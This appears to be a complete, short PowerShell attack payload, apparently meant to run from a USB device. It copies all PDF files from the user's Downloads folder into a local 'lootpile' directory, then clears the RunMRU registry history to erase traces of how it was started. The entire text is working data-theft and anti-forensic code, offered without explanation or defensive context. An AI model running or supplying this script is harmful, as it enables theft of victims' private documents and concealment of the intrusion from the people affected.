$exfil_dir="$Env:UserProfile\Downloads"
$exfil_ext="*.pdf"
$loot_dir="$PSScriptRoot\lootpile\"
mkdir $loot_dir
robocopy $exfil_dir $loot_dir $exfil_ext /S /MT /Z
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue